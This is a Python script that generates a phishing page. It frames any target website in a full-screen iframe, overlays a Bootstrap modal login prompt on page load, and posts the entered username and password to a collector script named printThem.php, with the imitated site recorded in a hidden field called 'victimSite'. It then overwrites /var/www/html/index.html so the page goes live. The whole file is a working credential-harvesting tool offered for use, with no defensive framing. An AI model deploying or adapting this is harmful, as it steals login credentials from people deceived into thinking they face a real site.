import os
import sys 

site = str(sys.argv[1]) #bring in website to emulate as a parameter

targetFile= open('index.html','w')

print ("\nEmulating website: " + site + " at http://localhost" + "\n")

#Generates an iframe of target website 
targetFile.write("\n")
targetFile.write("\n")
targetFile.write("<html>\n")
targetFile.write("\n")
targetFile.write("\n")
targetFile.write("\n<link rel=\"stylesheet\" href=\"https://netdna.bootstrapcdn.com/bootstrap/3.0.3/css/bootstrap.min.css\">")
targetFile.write("\n<link rel=\"stylesheet\" href=\"https://netdna.bootstrapcdn.com/bootstrap/3.0.3/css/bootstrap-theme.min.css\">")
targetFile.write("\n<script src=\"https://code.jquery.com/jquery-1.10.2.min.js\"></script>")
targetFile.write("\n<script src=\"https://netdna.bootstrapcdn.com/bootstrap/3.0.3/js/bootstrap.min.js\"></script>")
targetFile.write("\n")
targetFile.write("\n<body onLoad=\"$('#my-modal').modal('show');\">")
targetFile.write("\n")   
targetFile.write("\n<form action=\"printThem.php\" method=\"post\">")
# create hidden variable in HTML to send to the printThem.php file
targetFile.write("<input type=\"hidden\" name=\"victimSite\" value=\"" + site + "\">")
targetFile.write("\n")
targetFile.write("       <div id=\"my-modal\" class=\"modal fade\">")
targetFile.write("       <div class=\"modal-dialog\">")
targetFile.write("       <div class=\"modal-content\">")
targetFile.write("            <div class=\"modal-header\">")
targetFile.write("            <div>")
targetFile.write("")                           
targetFile.write("")                           
targetFile.write("")           
targetFile.write("              </div>")
targetFile.write("              <h4 class=\"modal-title\">Login information</h4>")
targetFile.write("               </div>")
targetFile.write("           <div class=\"modal-body\">")
targetFile.write("              <label for=\"usrnm\" class=\"ui-hidden-accessible\">Username:</label>")
targetFile.write("                   <input type=\"text\" name=\"user\" id=\"usrnm\" placeholder=\"Username\">")
targetFile.write("              <label for=\"pswd\" class=\"ui-hidden-accessible\">Password:</label>")
targetFile.write("                   <input type=\"password\" name=\"passw\" id=\"pswd\" placeholder=\"Password\">")
targetFile.write("")                            
targetFile.write("                     <label for=\"log\">Keep me logged in</label>")
targetFile.write("                    <input type=\"checkbox\" name=\"login\" id=\"log\" value=\"1\" data-mini=\"true\">")
targetFile.write("                    <input type=\"submit\" data-inline=\"true\" value=\"Log in\">")
targetFile.write("")
targetFile.write("")
targetFile.write("          </div>")
targetFile.write("      </div>")
targetFile.write("    </div>")
targetFile.write("  </div>")
targetFile.write("")
targetFile.write(" </form>")
targetFile.write("<!-- int file_put_contents ( string text.txt , mixed name [, int $flags = 0 [, resource $context ]] ) -->")
targetFile.write("")
#  This is where the iframe is generated 
targetFile.write("<iframe src=\"" + site + "\" style=\"border: 0; width: 100%; height: 100%\">Your browser doesn't support iFrames.</iframe>")
targetFile.write("")
targetFile.write("")
targetFile.write("</body>")
targetFile.write("</html>")

targetFile.close()

os.remove("/var/www/html/index.html")


os.rename("index.html", "/var/www/html/index.html")
